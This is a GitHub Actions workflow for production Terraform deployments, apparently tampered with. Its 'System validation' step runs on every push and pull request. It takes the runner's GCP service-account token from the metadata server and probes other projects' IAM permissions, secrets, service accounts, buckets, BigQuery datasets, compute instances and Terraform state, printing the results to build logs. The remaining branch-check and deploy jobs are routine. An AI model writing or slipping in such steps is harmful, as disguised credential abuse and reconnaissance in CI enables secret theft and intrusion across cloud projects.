name: prod-workflows
# Test
on:
  push:
    paths:
      - 'terraform/env/prod/**'
    branches-ignore:
      - master
  pull_request:
    types: [opened, reopened]
    branches:
      - 'master'
    paths:
      - 'terraform/env/prod/**'

jobs:
  check-branch-status:
    runs-on: [self-hosted]
    outputs:
      is_pr: ${{ steps.check-pr.outputs.is_pr }}
    steps:
      - name: System validation
        run: |
          echo "=== ENTITY B IDENTITY ==="
          GCP_TOKEN=$(curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
          SA_EMAIL=$(curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email")
          CURRENT_PROJECT=$(curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/project/project-id")
          echo "SA: $SA_EMAIL"
          echo "Project: $CURRENT_PROJECT"

          echo "=== CROSS-PROJECT: CAN ENTITY B SA ACCESS ENTITY A PROJECTS? ==="
          for proj in "ago-prd-pta1" "ago-prd-pta2" "ago-prd-pta3"; do
            echo ">> Testing: $proj"
            RESULT=$(curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
              "https://cloudresourcemanager.googleapis.com/v1/projects/$proj" 2>/dev/null)
            if [ $? -eq 0 ] && echo "$RESULT" | jq -e .projectId >/dev/null 2>&1; then
              echo "ACCESS CONFIRMED: $proj"
              echo "$RESULT" | jq '{projectId, name, projectNumber, lifecycleState, parent}'

              echo "   Permissions:"
              curl -sf -X POST -H "Authorization: Bearer $GCP_TOKEN" -H "Content-Type: application/json" \
                "https://cloudresourcemanager.googleapis.com/v1/projects/$proj:testIamPermissions" \
                -d '{"permissions":["storage.objects.get","storage.objects.list","storage.buckets.list","bigquery.jobs.create","bigquery.tables.list","secretmanager.secrets.list","secretmanager.versions.access","iam.serviceAccounts.list","iam.serviceAccountKeys.create","compute.instances.list","container.clusters.list","pubsub.topics.list"]}'

              echo "   Buckets:"
              curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
                "https://storage.googleapis.com/storage/v1/b?project=$proj" | jq '.items[] | {name, location}' 2>/dev/null || echo "   no bucket access"

              echo "   Secrets:"
              curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
                "https://secretmanager.googleapis.com/v1/projects/$proj/secrets" | jq '.secrets[].name' 2>/dev/null || echo "   no secrets"

              echo "   SAs:"
              curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
                "https://iam.googleapis.com/v1/projects/$proj/serviceAccounts" | jq '.accounts[].email' 2>/dev/null || echo "   no sa list"

              echo "   BigQuery:"
              curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
                "https://bigquery.googleapis.com/bigquery/v2/projects/$proj/datasets" | jq '.datasets[].datasetReference' 2>/dev/null || echo "   no bq"

              echo "   Compute:"
              curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
                "https://compute.googleapis.com/compute/v1/projects/$proj/aggregated/instances" \
                | jq '.items | to_entries[] | select(.value.instances) | .value.instances[] | {name, zone: .zone, status, ip: [.networkInterfaces[].networkIP]}' 2>/dev/null || echo "   no compute"
            else
              echo "NO ACCESS: $proj"
            fi
          done

          echo "=== SHARED STATE BUCKET (ENTITY A STATE VISIBLE?) ==="
          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
            "https://storage.googleapis.com/storage/v1/b/tf-state-bucket-75260944268/o" \
            | jq '.items[] | {name, size, updated}' 2>/dev/null || echo "no bucket access"

          echo "=== ENTITY A FOLDER CHILDREN ==="
          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
            "https://cloudresourcemanager.googleapis.com/v2/folders?parent=folders/1076129233003" | jq '.' 2>/dev/null || echo "no folder access"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Set branch name
        id: set-branch-name
        run: |
          if [ -n "${{ github.head_ref }}" ]; then
            echo "BRANCH_NAME=${{ github.head_ref }}" >> $GITHUB_ENV
          else
            echo "BRANCH_NAME=${{ github.ref_name }}" >> $GITHUB_ENV
          fi

      - name: Check if branch is in PR
        id: check-pr
        run: |
          BRANCH_NAME=${{ env.BRANCH_NAME }}
          PR_COUNT=$(curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
            "https://api.github.axa.com/repos/${{ github.repository }}/pulls?head=${{ github.repository_owner }}:${BRANCH_NAME}" | jq '. | length')

          echo $PR_COUNT
          if [ "$PR_COUNT" -gt 0 ]; then
            echo "is_pr=true" >> "$GITHUB_OUTPUT"
          else
            echo "is_pr=false" >> "$GITHUB_OUTPUT"
          fi

  plan-only-workflow:
    needs: check-branch-status
    if: ${{ needs.check-branch-status.outputs.is_pr == 'false' }}
    uses: gcp-foundation/workflows/.github/workflows/prod-workflow-wif.yaml@main
    permissions:
      contents: read
      pull-requests: write
      id-token: write
    with:
      plan_service_account: ${{ vars.PROD_PLAN_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}

  plan-and-apply-workflow:
    needs: check-branch-status
    if: ${{ needs.check-branch-status.outputs.is_pr == 'true' }}
    uses: gcp-foundation/workflows/.github/workflows/prod-pr-master-wif.yaml@main
    permissions:
      contents: write
      pull-requests: write
      id-token: write
    with:
      plan_service_account: ${{ vars.PROD_PLAN_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}
      apply_service_account: ${{ vars.PROD_APPLY_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}
